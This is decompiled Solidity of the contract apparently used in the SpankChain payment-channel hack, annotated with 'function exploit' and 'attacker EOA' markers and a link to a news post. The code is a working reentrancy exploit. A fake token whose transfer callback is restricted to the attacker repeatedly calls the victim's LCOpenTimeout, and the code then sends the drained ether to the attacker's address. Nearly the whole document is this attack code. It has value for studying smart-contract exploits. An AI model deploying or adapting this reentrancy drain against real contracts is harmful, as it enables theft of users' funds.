// Decompiled by library.dedaub.com
// 2022.12.03 07:57 UTC

//! news: https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe

// Data structures and variables inferred from the use of storage instructions
uint256 stor_0; // STORAGE[0x0]
uint256 _transfer; // STORAGE[0x1]


function () public payable { 
}

function transferFrom(address varg0, address varg1, uint256 varg2) public nonPayable { 
    require(0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199 == tx.origin);
    return 1;
}
//! function exploit
function 0x58f69e07(uint256 varg0) public payable { 
    //! attacker EOA
    require(0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199 == tx.origin);
    stor_0 = msg.value;
    _transfer = varg0;
    v0 = v1 = v1.data;
    v2 = v3 = 32 + MEM[64];
    while (v4 >= 32) {
        MEM[v0] = MEM[v2];
        v4 = v4 + ~31;
        v0 += 32;
        v2 += 32;
    }
    MEM[v0] = MEM[v2] & ~(256 ** (32 - v4) - 1) | MEM[v0] & 256 ** (32 - v4) - 1;
    v5 = v6 = 0;
    while (v5 < 64) {
        MEM[v5 + (132 + MEM[64])] = MEM[v5 + MEM[64]];
        v5 += 32;
    }
    require(0xf91546835f756da0c10cfa0cda95b15577b84aa7.code.size);
    //! init create channel
    v7 = 0xf91546835f756da0c10cfa0cda95b15577b84aa7.createChannel(~0x0 & (~0x0 & keccak256(0x6162630000000000000000000000000000000000000000000000000000000000)), msg.sender, 0 - block.timestamp, address(this), msg.value, 1).value(msg.value).gas(msg.gas);
    require(v7); // checks call status, propagates error data on error
    v8 = v9 = v9.data;
    v10 = v11 = 32 + MEM[64];
    while (v12 >= 32) {
        MEM[v8] = MEM[v10];
        v12 = v12 + ~31;
        v8 += 32;
        v10 += 32;
    }
    MEM[v8] = MEM[v8] & ~0 + 256 ** (32 - v12) | MEM[v10] & ~(~0 + 256 ** (32 - v12));
    MEM[v9.data] = 0x2e1d7e00000000000000000000000000000000000000000000000000000000;
    MEM[v9.data + 4] = keccak256(0x6162630000000000000000000000000000000000000000000000000000000000);
    require(0xf91546835f756da0c10cfa0cda95b15577b84aa7.code.size);
    v13 = 0xf91546835f756da0c10cfa0cda95b15577b84aa7.LCOpenTimeout(keccak256(0x6162630000000000000000000000000000000000000000000000000000000000)).gas(msg.gas);
    require(v13); // checks call status, propagates error data on error
    require(this.balance > 0);
    v14 = 0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199.call().value(this.balance).gas(2300 * !this.balance);
    require(v14); // checks call status, propagates error data on error
}

function transfer(address varg0, uint256 varg1) public nonPayable { 
    require(0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199 == tx.origin);
    _transfer += ~0;
    v0 = v1 = 0 < ~0 + _transfer;
    if (v1) {
        v0 = v2 = 0xf91546835f756da0c10cfa0cda95b15577b84aa7.balance >= stor_0;
    }
    if (v0) {
        v3 = v4 = v4.data;
        v5 = v6 = 32 + MEM[64];
        while (v7 >= 32) {
            MEM[v3] = MEM[v5];
            v7 = v7 + ~31;
            v3 += 32;
            v5 += 32;
        }
        MEM[v3] = MEM[v3] & ~0 + 256 ** (32 - v7) | MEM[v5] & ~(~0 + 256 ** (32 - v7));
        MEM[v4.data] = 0x2e1d7e00000000000000000000000000000000000000000000000000000000;
        MEM[v4.data + 4] = keccak256(0x6162630000000000000000000000000000000000000000000000000000000000);
        require(0xf91546835f756da0c10cfa0cda95b15577b84aa7.code.size);
        v8 = 0xf91546835f756da0c10cfa0cda95b15577b84aa7.LCOpenTimeout(keccak256(0x6162630000000000000000000000000000000000000000000000000000000000)).gas(msg.gas);
        require(v8); // checks call status, propagates error data on error
    }
    return 1;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        if (uint32(function_selector >> 224) == 0x23b872dd) {
            transferFrom(address,address,uint256);
        } else if (0x58f69e07 == uint32(function_selector >> 224)) {
            0x58f69e07();
        } else if (0xa9059cbb == uint32(function_selector >> 224)) {
            transfer(address,uint256);
        }
    }
    ();
}
